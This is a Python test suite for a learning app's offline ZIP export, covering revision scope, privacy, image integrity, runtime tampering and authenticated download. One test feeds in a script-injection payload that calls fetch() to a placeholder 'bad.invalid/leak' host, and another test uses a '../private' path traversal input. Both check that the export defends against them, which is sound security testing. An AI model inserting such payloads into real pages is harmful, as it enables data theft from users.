"""Real portable packages: exact scope, version pins, images, and failure isolation."""

import hashlib
import json
import re
import shutil
from zipfile import ZipFile

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import insert, select
from test_learning_paths import route
from test_practice_reviews import paper, question
from test_workbench_reading import course_pdf
from workbench_support import learning_course, note

from learning_app.app import create_app
from learning_app.config import PROJECT_ROOT, AppConfig
from learning_app.errors import AppError
from learning_app.storage.repository import _hash
from learning_app.workbench import book_schema as books
from learning_app.workbench import schema as s
from learning_app.workbench.artifacts import ArtifactStore
from learning_app.workbench.book_models import BookRevisionLayout
from learning_app.workbench.common import now
from learning_app.workbench.models import ArtifactBody, ArtifactCreate, ArtifactUpdate, BlockChange
from learning_app.workbench.offline import OfflineExporter
from learning_app.workbench.offline_resources import OfflineRuntime
from learning_app.workbench.sources import SourceStore


def package(repo, course, artifact):
    return OfflineExporter(repo).build(course, artifact.artifact_id, artifact.head_revision_id)


def unpack(stream):
    with stream, ZipFile(stream) as archive:
        files = {name: archive.read(name) for name in archive.namelist()}
    page = files["index.html"].decode("utf-8")
    match = re.search(
        r'<script type="application/json" id="learning-offline-data">(.*?)</script>', page, re.S
    )
    data = json.loads(match.group(1))
    manifest = json.loads(files["manifest.json"])
    assert {item["path"] for item in manifest["files"]} == set(files) - {"manifest.json"}
    for item in manifest["files"]:
        assert hashlib.sha256(files[item["path"]]).hexdigest() == item["sha256"]
        assert len(files[item["path"]]) == item["bytes"]
    return data, page, files


def test_old_revision_exact_selection_and_source_role_survive_missing_original_without_ancestor_text(
    tmp_path,
):
    repo, course, root, source = learning_course(tmp_path)
    store = ArtifactStore(repo)
    selected = SourceStore(repo).slice(source, 5, 9)
    original = store.create(
        course, note(text="仅讨论所选词", snapshot_id=selected.snapshot_id)
    ).artifact
    current = store.update(
        course,
        original.artifact_id,
        ArtifactUpdate(
            operation_id="newer",
            expected_revision_id=original.head_revision_id,
            changes=[
                BlockChange(
                    block_id="paragraph_1",
                    replacement={
                        "block_id": "paragraph_1",
                        "markdown": "NEW_VERSION_SENTINEL",
                        "attribution": "user_authored",
                    },
                )
            ],
        ),
    ).artifact
    (root / "lesson.txt").unlink()
    counts = repo.counts()
    data, _, _ = unpack(package(repo, course, original))
    assert data["blocks"][0]["markdown"] == "仅讨论所选词"
    assert data["sources"][0]["text"] == source.text[5:9]
    assert data["sources"][0]["role"] == "original"
    assert data["sources"][0]["label"] == "lesson.txt"
    serialized = json.dumps(data, ensure_ascii=False)
    assert source.text not in serialized and "不应补发前后文" not in serialized
    assert "NEW_VERSION_SENTINEL" not in serialized
    assert original.artifact_id not in serialized and source.snapshot_id not in serialized
    assert str(root) not in serialized
    assert "历史成果修订" in data["coverage"]
    assert store.get(course, original.artifact_id) == current
    assert repo.counts() == counts
    repo.close()


def test_content_is_data_even_with_script_closers_remote_images_and_html(tmp_path):
    repo, course, _, _ = learning_course(tmp_path)
    attack = '</script><script>window.OFFLINE_ATTACK=1;fetch("https://bad.invalid/leak")</script>'
    artifact = (
        ArtifactStore(repo)
        .create(course, note(text=attack + "\n![remote](https://bad.invalid/image)\n$x^2$"))
        .artifact
    )
    data, page, files = unpack(package(repo, course, artifact))
    assert data["blocks"][0]["markdown"].startswith(attack)
    assert attack not in page
    assert page.count("</script>") == 2
    assert "connect-src &#x27;none&#x27;" in page
    assert "worker-src blob:" in page and "font-src data:" in page
    assert set(files) == {"index.html", "notices.txt", "使用说明.txt", "manifest.json"}
    assert "katex" in files["notices.txt"].decode("utf-8")
    assert repo.counts()["outbound_attempts"] == 0
    repo.close()


def test_only_cited_authorized_page_image_is_included_and_corruption_never_substitutes(tmp_path):
    repo, course, opened, _ = course_pdf(tmp_path)
    sources = SourceStore(repo)
    image = sources.capture_document_image(course, opened["asset_id"], opened["source_version"], 0)
    artifact = (
        ArtifactStore(repo)
        .create(course, note(text="只看已授权页", snapshot_id=image.snapshot_id))
        .artifact
    )
    other = sources.capture_document_image(course, opened["asset_id"], opened["source_version"], 1)
    data, _, files = unpack(package(repo, course, artifact))
    name = data["sources"][0]["image"]
    assert name == f"assets/{image.reference.image_sha256}.png"
    assert files[name] == sources.image_path(image.reference.image_sha256).read_bytes()
    assert f"assets/{other.reference.image_sha256}.png" not in files
    sources.image_path(image.reference.image_sha256).write_bytes(b"changed, not the frozen PNG")
    with pytest.raises(AppError) as error:
        package(repo, course, artifact)
    assert error.value.code == "OFFLINE_IMAGE_HASH_MISMATCH"
    assert ArtifactStore(repo).get(course, artifact.artifact_id) == artifact
    repo.close()


def test_pinned_linked_question_versions_do_not_export_other_questions_or_learning_records(
    tmp_path,
):
    repo, course, _, _ = learning_course(tmp_path)
    first = paper(repo, course)
    other_question = question().model_copy(update={"markdown": "OTHER_QUESTION_MUST_STAY_PRIVATE"})
    newer = (
        ArtifactStore(repo)
        .update(
            course,
            first.artifact_id,
            ArtifactUpdate(
                operation_id="change_question",
                expected_revision_id=first.head_revision_id,
                changes=[BlockChange(block_id="q1", replacement=other_question)],
            ),
        )
        .artifact
    )
    path = route(
        repo,
        course,
        links=[
            {
                "artifact_id": first.artifact_id,
                "revision_id": first.head_revision_id,
                "block_id": "q1",
            }
        ],
        count=1,
    )
    before = repo.counts()
    data, _, _ = unpack(package(repo, course, path))
    linked = next(iter(data["linked_questions"].values()))
    assert len(linked) == 1 and linked[0]["markdown"] == first.revision.body.blocks[0].markdown
    serialized = json.dumps(data)
    for value in (
        "OTHER_QUESTION_MUST_STAY_PRIVATE",
        first.artifact_id,
        first.head_revision_id,
        newer.head_revision_id,
        path.artifact_id,
    ):
        assert value not in serialized
    assert data["blocks"][0]["step"]["questions"] == []
    assert repo.counts() == before and before["outbound_attempts"] == 0
    repo.close()


def test_same_block_id_in_two_linked_revisions_has_distinct_local_identity(tmp_path):
    repo, course, _, _ = learning_course(tmp_path)
    first = paper(repo, course)
    newer = (
        ArtifactStore(repo)
        .update(
            course,
            first.artifact_id,
            ArtifactUpdate(
                operation_id="change_question",
                expected_revision_id=first.head_revision_id,
                changes=[BlockChange(block_id="q1", replacement=question(reference="B"))],
            ),
        )
        .artifact
    )
    path = route(
        repo,
        course,
        links=[
            {
                "artifact_id": first.artifact_id,
                "revision_id": item.head_revision_id,
                "block_id": "q1",
            }
            for item in (first, newer)
        ],
        count=1,
    )
    data, _, _ = unpack(package(repo, course, path))
    linked = next(iter(data["linked_questions"].values()))
    assert {block["question"]["reference_answer"] for block in linked} == {"A", "B"}
    assert len({block["block_id"] for block in linked}) == 2
    repo.close()


def test_book_exports_only_selected_layout_and_keeps_unplaced_saved_blocks(tmp_path):
    repo, course, _, _ = learning_course(tmp_path)
    artifact = (
        ArtifactStore(repo)
        .create(
            course,
            ArtifactCreate(
                operation_id="book",
                kind="book",
                title="本版书",
                body=ArtifactBody(
                    blocks=[
                        {"block_id": identity, "markdown": identity, "attribution": "user_authored"}
                        for identity in ("page_block", "extra_block")
                    ]
                ),
            ),
        )
        .artifact
    )
    layout = BookRevisionLayout(
        origin_task_id="frozen_task",
        outline_hash="a" * 64,
        chapters=[
            {"chapter_id": "chapter", "title": "已存章", "objective": "", "source_ids": []},
            {"chapter_id": "waiting", "title": "尚无页面", "objective": "", "source_ids": []},
        ],
        pages=[
            {
                "page_id": "page",
                "chapter_id": "chapter",
                "unit_id": "unit",
                "title": "已存页",
                "order_key": (0, 0, 0),
                "block_ids": ["page_block"],
                "block_hashes": {"page_block": "b" * 64},
            }
        ],
    )
    with repo.engine.begin() as conn:
        conn.execute(
            insert(books.book_layouts).values(
                revision_id=artifact.head_revision_id,
                artifact_id=artifact.artifact_id,
                schema_version=1,
                layout=layout.model_dump(mode="json"),
                layout_hash=_hash(layout.model_dump(mode="json")),
                created_at=now(),
            )
        )
    data, _, _ = unpack(package(repo, course, artifact))
    assert [chapter["title"] for chapter in data["chapters"]] == [
        "已存章",
        "尚无页面",
        "本版补充内容",
    ]
    assert data["chapters"][1]["pages"] == []
    exported = {
        identity
        for chapter in data["chapters"]
        for page in chapter["pages"]
        for identity in page["block_ids"]
    }
    assert exported == {block["block_id"] for block in data["blocks"]}
    assert "frozen_task" not in json.dumps(data) and "unit" not in json.dumps(data)
    repo.close()


def test_failed_export_and_size_limit_have_no_business_side_effect_or_model_fallback(
    tmp_path, monkeypatch
):
    from learning_app.workbench import offline

    repo, course, _, source = learning_course(tmp_path)
    artifact = ArtifactStore(repo).create(course, note(snapshot_id=source.snapshot_id)).artifact
    before = repo.counts()

    def fault(name, _detail):
        if name == "learning_offline_before_finish":
            raise OSError("interrupted ZIP footer")

    repo.fault_hook = fault
    with pytest.raises(OSError, match="ZIP footer"):
        package(repo, course, artifact)
    repo.fault_hook = None
    monkeypatch.setattr(offline, "MAX_CONTENT_BYTES", 1)
    with pytest.raises(AppError) as error:
        package(repo, course, artifact)
    assert error.value.code == "OFFLINE_CONTENT_LIMIT"
    assert repo.counts() == before
    with repo.engine.connect() as conn:
        assert conn.execute(select(s.task_runs.c.run_id)).first() is None
    repo.close()


def test_runtime_import_is_fixed_and_tampering_is_rejected(tmp_path):
    root = tmp_path / "project"
    (root / "resources/workbench").mkdir(parents=True)
    shutil.copyfile(
        PROJECT_ROOT / "resources/workbench/offline-runtime.lock.json",
        root / "resources/workbench/offline-runtime.lock.json",
    )
    runtime = OfflineRuntime(root)
    incoming = tmp_path / "prepared-input"
    shutil.copytree(OfflineRuntime().directory, incoming)
    runtime.prepare(incoming)
    assert runtime.read()["reader.js"] == OfflineRuntime().read()["reader.js"]
    (runtime.directory / "reader.js").write_bytes(b"arbitrary executable")
    with pytest.raises(AppError) as error:
        runtime.read()
    assert error.value.code == "OFFLINE_RUNTIME_NOT_PREPARED"
    with pytest.raises(AppError):
        runtime.path(incoming, "../private")


def test_authenticated_download_is_pinned_and_cross_course_or_other_artifact_revision_is_denied(
    tmp_path,
):
    repo, course, _, _ = learning_course(tmp_path)
    artifact = ArtifactStore(repo).create(course, note()).artifact
    other = repo.create_course("other")
    config = AppConfig(mode="test", data_dir=repo.root, runtime_dir=tmp_path / "run")
    path = f"/api/v1/courses/{course}/learning/artifacts/{artifact.artifact_id}/offline-export"
    with TestClient(
        create_app(config, repository=repo), base_url="http://127.0.0.1:8765"
    ) as client:
        assert client.post(path, json={"revision_id": artifact.head_revision_id}).status_code == 403
        token = client.get("/api/v1/session").json()["csrf_token"]
        headers = {"X-Learning-CSRF": token}
        assert (
            client.post(
                path, headers=headers, json={"revision_id": "not_this_revision"}
            ).status_code
            == 404
        )
        assert (
            client.post(
                path.replace(course, other["course_id"]),
                headers=headers,
                json={"revision_id": artifact.head_revision_id},
            ).status_code
            == 404
        )
        response = client.post(
            path, headers=headers, json={"revision_id": artifact.head_revision_id}
        )
        assert response.status_code == 200 and response.headers["content-type"] == "application/zip"
        assert (
            response.content.startswith(b"PK")
            and "attachment;" in response.headers["content-disposition"]
        )
        assert repo.counts()["outbound_attempts"] == 0
